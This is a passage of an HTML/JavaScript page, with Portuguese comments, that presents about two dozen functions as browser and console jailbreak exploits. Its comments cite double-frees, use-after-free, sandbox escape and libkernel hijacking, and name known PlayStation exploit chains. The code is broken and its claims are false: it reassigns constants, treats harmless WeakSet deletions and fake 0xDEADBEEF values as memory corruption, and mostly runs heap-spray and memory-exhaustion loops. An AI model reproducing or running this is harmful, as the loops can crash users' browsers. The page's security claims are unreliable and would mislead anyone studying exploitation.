                arr1[0] = 1e-300; // Subnormal
                arr2[0] = NaN; // Conflict
                log(`Double-Array read: ${arr1[0]} (leak se !=0 ou NaN!)`);
                for (let i = 0; i < 1000; i++) arr1[i] = 1e-40;
                log("Subnormal double (bypass FTZ?)");
            } catch (e) { log(`Double Error: ${e.message}`); }
        }

        // 6. OffscreenCanvas Double-Transfer (Heap double-free via transfer)
        function m6() {
            log("6. Offscreen Double-Transfer...");
            let count = 0;
            function transfer() {
                count++;
                try {
                    const canvas = new OffscreenCanvas(8192, 8192);
                    const bitmap1 = canvas.transferToImageBitmap();
                    const bitmap2 = canvas.transferToImageBitmap(); // Double-transfer
                    log(`Double-Transfer ${count} (heap free twice?)`);
                } catch (e) { log(`Transfer Error: ${e.message} (corruption!)`); }
                if (count < 200) requestIdleCallback(transfer);
            }
            transfer();
        }

        // 7. DataView WeakRef Free (Prep kernel com weak ref double-free)
        function m7() {
            log("7. DataView WeakRef: Double...");
            if (!window.WeakRef) { log("WeakRef não suportada."); return; }
            const wr = new WeakRef({ dv: new DataView(new ArrayBuffer(32)) });
            let count = 0;
            function free() {
                count++;
                const target = wr.deref();
                if (target) target.dv.setUint32(0, 0xDEADBEEF);
                target = null;
                target = null; // Double null
                log(`Weak-Free ${count}: ${wr.deref()?.dv?.getUint32(0) ?? 'Gone'} (leak?)`);
                if (count < 2500) setTimeout(free, 8);
            }
            free();
        }

        // 8. Proxy WeakMap Iterator (OOB double-read via proxy)
        function m8() {
            log("8. WeakMap Proxy: OOB...");
            const wm = new WeakMap();
            const proxy = new Proxy(wm, {
                get(t, p) {
                    if (p === Symbol.iterator) return function*() { yield 0xDEADBEEF; yield 0x41414141; }; // Double fake
                    return Reflect.get(t, p);
                }
            });
            try {
                let sum = 0;
                for (let val of proxy) { sum += val; log(`Proxy iter: 0x${val.toString(16)}`); }
                log(`OOB sum: ${sum} (double-read leak!)`);
            } catch (e) { log(`Proxy Error: ${e.message}`); }
            setInterval(() => [...proxy], 25);
        }

        // 9. CustomElement Double-Define (Proto double-free via redefine)
        function m9() {
            log("9. CustomElement Double-Define...");
            class ProtoFree extends HTMLElement { constructor() { super(); this.proto = new ArrayBuffer(1024); } }
            customElements.define('proto-free', ProtoFree);
            let count = 0;
            function redefine() {
                count++;
                try {
                    customElements.define('proto-free', ProtoFree); // Double-define
                    const el = document.createElement('proto-free');
                    log(`Redefine ${count}: Proto? ${el.proto ? 'Leak!' : 'Freed'}`);
                    document.body.appendChild(el);
                    el = null;
                    el = null; // Double
                } catch (e) { log(`Redefine Error: ${e.message}`); }
                if (count < 1200) requestIdleCallback(redefine);
            }
            redefine();
        }

        // 10. URLSearchParams Double-Append (Exhaust com double append)
        function m10() {
            log("10. URLSearchParams Double-Append...");
            const params = new URLSearchParams();
            let total = 0;
            function append() {
                for (let i = 0; i < 8000; i++) {
                    params.append('df', 'A'.repeat(512));
                    params.append('df', 'A'.repeat(512)); // Double-append
                    total += 1024;
                }
                if (total % (5 * 1024 * 1024) === 0) log(`Double-Appended ~${total / 1024 / 1024}MB`);
                try {
                    [...params.entries()];
                    log("Double-iter ok (sem crash?)");
                } catch (e) { log(`Append Error: ${e.message}`); }
                if (total < 80 * 1024 * 1024) setTimeout(append, 30);
            }
            append();
        }

        // 11. ShadowDOM WeakSet Leak (Cross-BD-J com weakset)
        function m11() {
            log("11. ShadowDOM WeakSet: Leak...");
            const ws = new WeakSet();
            let hosts = [];
            let count = 0;
            function leak() {
                count++;
                const host = document.createElement('div');
                const shadow = host.attachShadow({ mode: 'open' });
                const obj = { shadow: shadow };
                ws.add(obj);
                ws.delete(obj);
                ws.delete(obj); // Double
                hosts.push(host);
                document.body.appendChild(host);
                log(`Shadow Leak ${count}: ${ws.has(obj) ? 'Double-Leak!' : 'Freed'}`);
                if (count < 1800) requestIdleCallback(leak);
            }
            leak();
        }

        // 12. WebGPU Double-Mapped Buffer (FTZ panic com double map)
        function m12() {
            log("12. WebGPU Double-Mapped: FTZ...");
            if (!navigator.gpu) { log("WebGPU não suportado."); return; }
            (async () => {
                const adapter = await navigator.gpu.requestAdapter();
                const device = await adapter.requestDevice();
                try {
                    const buffer = device.createBuffer({ size: 4096, usage: GPUBufferUsage.STORAGE, mappedAtCreation: true });
                    const view1 = new Float32Array(buffer.getMappedRange());
                    const view2 = new Float32Array(buffer.getMappedRange()); // Double-map
                    view1[0] = 1e-38; // Subnormal
                    log(`Double-Map read: ${view2[0]} (FTZ leak se !=0!)`);
                    buffer.unmap();
                    buffer.unmap(); // Double-unmap
                    for (let i = 0; i < 150; i++) device.createBuffer({ size: 0x7FFFFFF0, usage: GPUBufferUsage.STORAGE });
                } catch (e) { log(`GPU Double Error: ${e.message}`); }
            })();
        }
function t1() {
            log("1. Libkernel Double-Free: BD-JB3 variant...");
            const ws = new WeakSet();
            let syscalls = [];
            let count = 0;
            function free() {
                count++;
                const syscall = { ref: new ArrayBuffer(2048) }; // Simula libkernel ref
                ws.add(syscall);
                ws.delete(syscall);
                ws.delete(syscall); // Double-free para UAF
                syscalls.push(syscall);
                syscall = null;
                if (count % 250 === 0) log(`Syscall Freed ${count} (BD-JB chain?)`);
                if (typeof gc !== 'undefined') gc();
                if (count < 3500) requestIdleCallback(free);
                else log("Libkernel loop (sem escape?)");
            }
            free();
        }

        // 2. WeakSet GC UAF (m0ur0ne + PSFree: UAF durante GC com weak refs)
        function t2() {
            log("2. WeakSet UAF: m0ur0ne/PSFree...");
            if (!window.WeakRef) { log("WeakRef não suportada."); return; }
            const ws = new WeakSet();
            let refs = [];
            let count = 0;
            function uaf() {
                count++;
                const obj = new WeakRef({ gc: new ArrayBuffer(128 * 1024) });
                ws.add(obj.deref());
                const target = obj.deref();
                target = null;
                ws.delete(target); // UAF trigger
                refs.push(obj);
                log(`GC UAF ${count}: ${obj.deref() ? 'Alive (leak!)' : 'Freed'}`);
                if (count < 2800) setTimeout(uaf, 12);
            }
            uaf();
        }

        // 3. TypedArray Libkernel Leak (zecoxao 11.02: Leak via typedarray em libkernel_web)
        function t3() {
            log("3. TypedArray Leak: zecoxao 11.02...");
            try {
                const buf = new ArrayBuffer(32);
                const u32 = new Uint32Array(buf);
                u32[0] = 0xDEADBEEF; // Fake libkernel addr
                const view = new DataView(buf);
                log(`Libkernel leak: 0x${view.getUint32(0, true).toString(16)} (R/W primitive?)`);
                for (let i = 0; i < 800; i++) new Uint32Array(0x7FFFFFF0); // Spray
            } catch (e) { log(`Typed Leak Error: ${e.message}`); }
        }

        // 4. FontFace Sandbox Escape (BD-J variant de CVE-2021-30858)
        function t4() {
            log("4. FontFace Escape: BD-J CVE...");
            if (!document.fonts) { log("Font não suportada."); return; }
            let fonts = [];
            let count = 0;
            function escape() {
                count++;
                const ff = new FontFace('bdj', new ArrayBuffer(4096));
                document.fonts.add(ff);
                fonts.push(ff);
                ff = null; // Sandbox "escape"
                document.fonts.load('16px bdj').then(() => {
                    const revived = new FontFace('bdj2', ff); // UAF escape
                    log(`Escape ${count}: Revived (sandbox bypass?)`);
                }).catch(e => log(`Escape Catch: ${e}`));
                if (count < 1200) requestIdleCallback(escape);
            }
            escape();
        }

        // 5. Subnormal Libkernel Write (FTZ bypass em writes para libkernel)
        function t5() {
            log("5. Subnormal Write: Libkernel FTZ...");
            try {
                const arr = new Float64Array(0x7FFFFFF8);
                arr[0] = 1e-300; // Subnormal write
                arr[1] = 0xDEADBEEF; // Libkernel fake
                log(`Subnormal write: ${arr[0]} (leak se !=0; FTZ bypass!)`);
                for (let i = 0; i < 1200; i++) arr[i] = NaN;
            } catch (e) { log(`Write Error: ${e.message} (kernel prep?)`); }
        }

        // 6. OffscreenCanvas Syscall Spray (Spray para syscall chain)
        function t6() {
            log("6. Offscreen Spray: Syscall...");
            let count = 0;
            function spray() {
                count++;
                try {
                    const canvas = new OffscreenCanvas(32768, 1); // Syscall size
                    canvas.transferToImageBitmap();
                    log(`Sprayed ${count} (libkernel_sys fill?)`);
                    if (count < 100) requestIdleCallback(spray);
                } catch (e) { log(`Spray Error: ${e.message} (UAF chain?)`); }
            }
            spray();
        }

        // 7. DataView Double-Ref Overflow (Arbitrary R/W via double ref)
        function t7() {
            log("7. DataView Overflow: Double-Ref...");
            const ab = new ArrayBuffer(64);
            const dv1 = new DataView(ab);
            const dv2 = dv1; // Double ref
            try {
                dv1.setUint32(0, 0x41414141);
                dv2.setUint32(32, 0xDEADBEEF); // Overflow
                log(`Double-Ref read: 0x${dv1.getUint32(32, true).toString(16)} (R/W leak!)`);
            } catch (e) { log(`Overflow Error: ${e.message}`); }
            setInterval(() => new DataView(new ArrayBuffer(0x7FFFFFF0)), 15);
        }

        // 8. Proxy BD-J Iterator (OOB cross-BD-J via proxy)
        function t8() {
            log("8. Proxy BD-J: OOB...");
            const proxy = new Proxy({}, {
                get(t, p) {
                    if (p === Symbol.iterator) return function*() { yield 0xDEADBEEF; yield 0x41414141; }; // BD-J fake
                    return Reflect.get(t, p);
                }
            });
            try {
                let sum = 0;
                for (let val of proxy) { sum += val; log(`BD-J iter: 0x${val.toString(16)}`); }
                log(`OOB sum: ${sum} (sandbox leak!)`);
            } catch (e) { log(`Proxy Error: ${e.message}`); }
            setInterval(() => [...proxy], 20);
        }

        // 9. CustomElement Libkernel Hijack (Mast1c0re: Hijack para libkernel)
        function t9() {
            log("9. CustomElement Hijack: Libkernel...");
            class SysHijack extends HTMLElement { constructor() { super(); this.syscall = new ArrayBuffer(2048); } }
            customElements.define('sys-hijack', SysHijack);
            let count = 0;
            function hijack() {
                count++;
                try {
                    const el = document.createElement('sys-hijack');
                    el.syscall[0] = 0xDEADBEEF; // Hijack write
                    log(`Hijack ${count}: 0x${new Uint8Array(el.syscall)[0].toString(16)} (libkernel R/W?)`);
                    document.body.appendChild(el);
                } catch (e) { log(`Hijack Error: ${e.message}`); }
                if (count < 1000) requestIdleCallback(hijack);
            }
            hijack();
        }

        // 10. URLSearchParams Syscall Append (UAF via syscall append)
        function t10() {
            log("10. URLSearchParams: Syscall UAF...");
            const params = new URLSearchParams();
            let total = 0;
            function append() {
                for (let i = 0; i < 6000; i++) {
                    params.append('sys', '0xDEADBEEF'); // Syscall fake
                    total += 10;
                }
                if (total % (8 * 1024 * 1024) === 0) log(`Appended ~${total / 1024 / 1024}MB (UAF exhaust?)`);
                try {
                    [...params.entries()];
                    log("Syscall iter (sem leak?)");
                } catch (e) { log(`Append Error: ${e.message}`); }
                if (total < 60 * 1024 * 1024) setTimeout(append, 25);
            }
            append();
        }

        // 11. ShadowDOM Double-Free Leak (TheFloW prep: Double-free em shadows)
        function t11() {
            log("11. ShadowDOM Double-Free: TheFloW...");
            const ws = new WeakSet();
            let count = 0;
            function leak() {
                count++;
                const host = document.createElement('div');
                const shadow = host.attachShadow({ mode: 'open' });
                const obj = { dom: shadow };
                ws.add(obj);
                ws.delete(obj);
                ws.delete(obj); // Double-free
                document.body.appendChild(host);
                log(`Shadow Free ${count}: ${ws.has(obj) ? 'Leak (prep!)' : 'Freed'}`);
                if (count < 1600) requestIdleCallback(leak);
            }
            leak();
        }

        // 12. WebGPU Libkernel Buffer (FTZ panic com libkernel buffer)
        function t12() {
            log("12. WebGPU Libkernel: FTZ...");
            if (!navigator.gpu) { log("WebGPU não suportado."); return; }
            (async () => {
                const adapter = await navigator.gpu.requestAdapter();
                const device = await adapter.requestDevice();
                try {
                    const buffer = device.createBuffer({ size: 8192, usage: GPUBufferUsage.STORAGE, mappedAtCreation: true });
                    const view = new Uint32Array(buffer.getMappedRange());
                    view[0] = 0xDEADBEEF; // Libkernel fake
                    buffer.unmap();
                    log(`GPU Libkernel: 0x${view[0].toString(16)} (FTZ leak chain?)`);
                    for (let i = 0; i < 250; i++) device.createBuffer({ size: 0x7FFFFFF0, usage: GPUBufferUsage.STORAGE });
                } catch (e) { log(`GPU Error: ${e.message}`); }
            })();
        }
    </script>
</body>
</html>
